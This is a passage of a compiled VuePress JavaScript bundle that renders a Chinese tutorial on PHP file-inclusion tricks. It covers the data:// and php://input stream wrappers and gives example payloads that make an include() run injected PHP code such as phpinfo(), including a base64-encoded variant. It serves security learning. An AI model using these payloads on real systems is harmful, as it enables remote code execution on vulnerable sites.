"),t("h3",{attrs:{id:"data"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#data"}},[s._v("#")]),s._v(" data://")]),s._v(" "),t("blockquote",[t("p",[s._v("注意：data:text/plain，php://input等伪协议需要在php.ini配置文件中打开"),t("strong",[s._v("allow_url_fopen，allow_url_include")]),s._v("这两项")])]),s._v(" "),t("blockquote",[t("p",[s._v("数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:text/plain流中如果有PHP代码，将会被当作php正常执行。")])]),s._v(" "),t("p",[s._v("两种形式")]),s._v(" "),t("blockquote",[t("p",[s._v("data://text/plain在 PHP 中可用于打开文本数据流，而data:text/plain则是在 URL 中表示纯文本数据的 MIME 类型。")])]),s._v(" "),t("p",[s._v("可以直接逗号,加php代码，也可以分号;base64编码混淆一下")]),s._v(" "),t("p",[s._v("用法：")]),s._v(" "),t("div",{staticClass:"language-php line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-php"}},[t("code",[s._v("url?c=include$_GET[1];&1=data:text/plain,"),t("span",{pre:!0,attrs:{class:"token php language-php"}},[t("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?php")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("phpinfo")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),t("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("?>")])]),s._v("\nurl?c=include$_GET[1];&1=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("h3",{attrs:{id:"php-input"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#php-input"}},[s._v("#")]),s._v(" php://input")]),s._v(" "),t("blockquote",[t("p",[s._v("可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行")])]),s._v(" "),t("p",[s._v("payload3："),t("strong",[s._v("url?c=include$_GET[1];&1=php://input")])]),s._v(" "),t("p",[s._v("POST:")]),s._v(" "),t("div",{staticClass:"language-php line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-php"}},[t("code",[t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),t("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'hello'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])])])}),[],!1,null,null,null);t.default=e.exports}}]);